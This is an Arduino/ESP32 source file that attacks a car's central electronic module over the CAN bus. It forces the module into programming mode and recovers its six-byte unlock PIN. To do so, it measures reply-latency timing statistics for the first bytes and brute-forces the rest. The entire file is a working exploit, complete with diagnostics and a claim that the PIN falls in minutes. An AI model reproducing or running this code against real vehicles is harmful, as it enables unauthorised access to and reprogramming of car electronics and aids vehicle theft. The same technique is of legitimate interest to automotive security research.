#include <SPI.h>
#include <mcp_can.h>
#include <mcp_can_dfs.h>

/* uncomment for latency diagnostics */
//#define DIAG

#define CAN_CS_PIN 27
#define CAN_L_PIN  26
#define PIN_LEN     6

#ifdef DIAG
#define SAMPLES   300
#else
#define SAMPLES  3000
#endif

byte known_pin[PIN_LEN] = { 0x53, 0x38, 0x03, 0x21, 0x18, 0x02 }; // needed only for diagnostic

MCP_CAN CAN(CAN_CS_PIN);

bool cem_print = true;

byte to_bcd(byte b)
{
  return ((b / 10) << 4) | (b % 10);
}

bool cem_unlock(byte *pin, int *lat, bool shuffle)
{
  byte b[8] = { 0x50, 0xbe };
  byte *p = b + 2;
  long start, end;
  byte len;
  unsigned long id;

  if (shuffle) {
    p[3] = pin[0];
    p[1] = pin[1];
    p[5] = pin[2];
    p[0] = pin[3];
    p[2] = pin[4];
    p[4] = pin[5];
  } else {
    memcpy(p, pin, 6);
  }

  start = xthal_get_ccount();
  cem_send(0xffffe, b);
  while (digitalRead(CAN_L_PIN));
  end = xthal_get_ccount();
  cem_receive(true, &id, b);
  *lat = (int)(end - start);
  return b[2] == 0x00;
}

int cem_max(const void *a, const void *b)
{
  return *(int *)a - *(int *)b;
}

int cem_min(const void *a, const void *b)
{
  return *(int *)b - *(int *)a;
}

int sample[SAMPLES];

double cem_pin_std(byte seq[], int samples, bool std_ext, int *mean_, int *df_)
{
  int mean;
  double std;
  unsigned long x = 0;
  int ret;
  int df = 0;
  int s1 = 1;
  int s2 = samples * 157 / 1000; // μ - 2σ

  if (std_ext) {
    s1 = samples * 2 / 10; // [0.2..0.3]
    s2 = samples * 3 / 10;
  }

  memset(sample, 0, sizeof(sample));

  /* sampling same byte SAMPLES times */
  for (int k = 0; k < samples; k++) {
    int lat;
    ret = cem_unlock(seq, &lat, true);
    sample[k] = lat;
  }

  qsort(sample, samples, sizeof(int), cem_max);

  for (int k = s1; k < s2; k++) {
     df += sample[k] - sample[k -1];
  }

  for (int l = s1; l < s2; l++) {
    x += sample[l];
  }
  mean = x / (s2 - s1);

  x = 0;
  for (int l = s1; l < s2; l++) {
    x += (sample[l] - mean) * (sample[l] - mean);
  }
  std = sqrt(x / (s2 - s1));
  *mean_ = mean;
  
  if (df_)
    *df_ = df;

  return std;
}

void cem_crack_diag(char *memo, int samples, int i, int j, byte *seq, byte *pin, int mean, int mean_max, double std, double std_min, bool std_ext, int df, int df_max)
{
  if (memo)
    printf(memo);
  for (int k = 0; k < PIN_LEN; k++) {
    if (i == k)
      printf("[ ");
    printf("0x%02x ", seq[k]);
    if (i == k)
      printf("] ");
  }
  if (!std_ext)
    printf(" -- pos %d, lat min/avg/max %d/%d/%d, mean %d, std %3.2f, best std @ 0x%02x + %3.2f\n", i, sample[0], sample[samples / 2], sample[samples - 1], mean, std, pin[i], (std - std_min));
  else
    printf(" -- pos %d, lat min/avg/max %d/%d/%d, mean %d, std %3.2f, df %d, best df @ 0x%02x + %d\n", i, sample[0], sample[samples / 2], sample[samples - 1], mean, std, df, pin[i], (df - df_max));
}

int cem_print_crack_rate()
{
  byte pin[PIN_LEN];
  long start, end;
  int ret, lat;
  bool cp = cem_print;
  int n = 1000;
  int rate;

  cem_print = false;

  start = millis();
  for (int i = 0; i < n; i++)
    ret = cem_unlock(pin, &lat, true);
  end = millis();
  rate = 1000 * n / (end - start);
  printf("%d pins in %d ms, %d pins/s\n", n, (end - start), rate);
  cem_print = cp;
  return rate;
}

int sss[10][SAMPLES];

void cem_diag_latency()
{
  byte pin[PIN_LEN];
  int i, j, k;
  bool cp = cem_print;

  cem_print = false;

  memset (pin, 0, sizeof(pin));

  for (i = 0; i < PIN_LEN; i++) {
    for (j = 0; j < 10; j++) {
      pin[i] = to_bcd((known_pin[i] >> 4) * 10 + j);
      for (k = 0; k < SAMPLES; k++) {
        int lat;
        cem_unlock(pin, &lat, true);
        sss[j][k] = lat;
      }
      qsort(sss[j], SAMPLES, sizeof(int), cem_max);
    }
    printf("\n# ");
    for (int k = 0; k < PIN_LEN; k++) {
      if (i == k)
        printf("[ ");
      printf("0x%02x ", pin[k]);
      if (i == k)
        printf("] ");
    }

    printf("\n");

    for (k = 0; k < SAMPLES; k++) {
      printf("%d ", k);
      for (j = 0; j < 10; j++) {
        printf("%d ", sss[j][k]);
      }
      printf("\n");
    }
    pin[i] = known_pin[i];
  }
  cp = cem_print;
}

void cem_crack_pin(int n)
{
  byte pin[PIN_LEN];
  float std_min = 0.0;
  int mean_max = 0;
  int df_max;
  byte seq[PIN_LEN] = { 0 };
  int i, j, k, q;
  int lat;
  int ret;
  bool cp = cem_print;
  int s = 0;
  int rate;
  int samples = SAMPLES / n;
  bool std_ext = false;
  int start = 0; // position to start with. copies first bytes from known_pin

  cem_print = false;
again:
  memset (pin, 0, sizeof(pin));
  memset (seq, 0, sizeof(seq));
  memcpy(seq, known_pin, start);
  memcpy(pin, known_pin, start);

  for (i = start; i < n; i++) { /* for every byte in PIN besides last N*/
    mean_max = 0;
    std_min = 0.0;
    df_max = 0;
/*    
 *  Bytes 0 and 1 can be found by calculating reply latency's standard deviation (correct bytes has the lowest STD)
 *  Bytes 2 can be found by looking at the derivative in the sorted range [0.2..0.3] from all samples (correct byte raises quickest)
 *  Bytes 3-5 can be brute-forced in under 8-9 minutes (typically quicker)
 */
    std_ext = i > 1;
    if (std_ext)
      samples = SAMPLES / 3;

//    s = (seq_[i] >> 4) * 10;
//    for (j = s; j < s + 10; j++) { /* for every permutation of BCD-byte */
    for (j = 0; j < 100; j++) { /* for every permutation of BCD-byte */
      bool good;
      double std;
      int mean;
      int df = 0;

      seq[i] = to_bcd(j);
      std = cem_pin_std(seq, samples, std_ext, &mean, &df);

      cem_crack_diag(NULL, samples, i, j, seq, pin, mean, mean_max, std, std_min, std_ext, df, df_max);

      good = std_ext ? df > df_max : std < std_min;

      if (j == s) {
          std_min = std;
          mean_max = mean;
          pin[i] = seq[i];
      } else if (good) {
        byte old_seq[PIN_LEN];
        double old_std, new_std;
        int old_mean, new_mean;
        int old_df, new_df;
        int samples = std_ext ? SAMPLES : SAMPLES / 2;

        memcpy(old_seq, seq, PIN_LEN);
        old_seq[i] = pin[i];
        old_std = cem_pin_std(old_seq, samples, std_ext, &old_mean, &old_df);
        cem_crack_diag("recalc std for old pin: ", samples, i, j, old_seq, pin, old_mean, mean_max, old_std, std_min, std_ext, old_df, df_max);

        new_std = cem_pin_std(seq, samples, std_ext, &new_mean, &new_df);
        cem_crack_diag("recalc std for new pin: ", samples, i, j, seq, pin, new_mean, mean_max, new_std, std_min, std_ext, new_df, df_max);

        good = std_ext? new_df > old_df : new_std < old_std;

        if (good) {
          std_min = new_std;
          mean_max = new_mean;
          pin[i] = seq[i];
          df_max = new_df;
        } else {
          std_min = old_std;
          mean_max = old_mean;          
          df_max = old_df;
        }
      }
      if (ret) { /* found pin */
        pin[i] = seq[i];
        goto out;
      }
    }
    seq[i] = pin[i];
  }

  q = i;

  rate = cem_print_crack_rate();
  for (int i = 0; i < PIN_LEN; i++) {
    printf("0x%02x ", i < n ? pin[i] : 0);
  }
  printf(" -- brute forcing bytes %d to %d, will take up to %ld seconds\n", q, PIN_LEN - 1, (long)pow(100, PIN_LEN - n) / rate);

  for (unsigned long m = 0; m < pow(100, (PIN_LEN - n)); m++) {
    unsigned long f = m;
    for (int k = q; k < PIN_LEN; k++) {
      pin[k] = to_bcd(f % 100);
      f /= 100;
    }
    if ((m % 999) == 0) {
      for (int k = 0; k < PIN_LEN; k++) {
        printf("0x%02x ", pin[k]);
      }
      printf("\n");
    }
    if (cem_unlock(pin, &lat, true))
      goto out;
  }
  start = 2; /* first two bytes are detecting very reliably, so don't waste time */
  goto again;
out:
  printf("found PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x\n", pin[3], pin[1], pin[5], pin[0], pin[2], pin[4]);
  cem_print = cp;
}

void cem_send(unsigned long id, byte *d)
{
    if (cem_print)
      printf("send: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n", id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
    CAN.sendMsgBuf(id, 1, 8, d);
}

bool cem_receive(bool wait, unsigned long *id, byte *data)
{
  byte d[8] = { 0 };
  byte len;
  int ret;
  unsigned long can_id = 0;

  do {
    ret = (CAN.checkReceive() == CAN_MSGAVAIL);
    if (ret) {
      CAN.readMsgBuf(&len, d);
      can_id = CAN.getCanId();
    }
  } while (!ret && wait);

  if (id)
    *id = can_id;
  if (data)
    memcpy(data, d, 8);

  if (ret && cem_print)
    printf("recv: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n", can_id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);

  return ret;
}

void cem_read_serial_number()
{
  unsigned long id;
  byte d[8];
  int ret;
  byte data[8] = { 0x50, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  
  printf("reading serial number\n");
  cem_send(0xFFFFE, data);

  ret = cem_receive(true, &id, d);
}

void cem_programming_mode_on()
{
  byte data[8] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  int time = 5000;
  int _delay = 5;
  int cp = cem_print;

  printf("sending CEM into programming mode\n");
  cem_send(0xFFFFE, data);
  cem_print = false;
  while (time > 0) {
    cem_send(0xFFFFE, data);
    time -= _delay;
    delay(_delay);
  }
  cem_print = cp;
}

void cem_reset()
{
  byte data[8] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  printf("reset CEM\n");
  for (int i = 0; i < 50; i++) {
    cem_send(0xFFFFE, data);  delay(100);
  }
}

void setup() {
  Serial.begin(115200);
  disableCore0WDT();
  disableCore1WDT();
  pinMode(CAN_L_PIN, INPUT);

  printf("can init\n");
  while (MCP2515_OK != CAN.begin(CAN_500KBPS, MCP_8MHz)) {
    delay(1000);
  }

  printf("done\n");

  while (cem_receive(false, NULL, NULL)); // flush queue
  cem_programming_mode_on();
  while (cem_receive(false, NULL, NULL)); // flush queue

  cem_read_serial_number();

#ifdef DIAG
  cem_diag_latency();
#else
  cem_crack_pin(3);
#endif
  cem_reset();
}

void loop() {
  cem_receive(true, NULL, NULL);
}
